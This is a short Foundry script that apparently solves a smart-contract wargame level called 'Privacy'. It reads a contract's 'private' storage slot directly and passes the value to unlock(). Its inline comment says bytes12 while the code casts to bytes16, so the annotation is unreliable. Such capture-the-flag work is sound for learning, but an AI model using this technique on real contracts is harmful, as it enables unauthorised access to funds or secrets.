// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel12.sol";
import "forge-std/Script.sol";

contract POC is Script {
    Privacy level12 = Privacy(0x980f425AF5e5BBA950F3925dB2403a7cEb004877);

    function run() external {
        vm.startBroadcast();
        bytes32 mKey = vm.load(address(level12), bytes32(uint256(5))); //get data at storage 5 of the contract
        level12.unlock(bytes16(mKey)); //downcast to bytes12
        vm.stopBroadcast();
    }
}
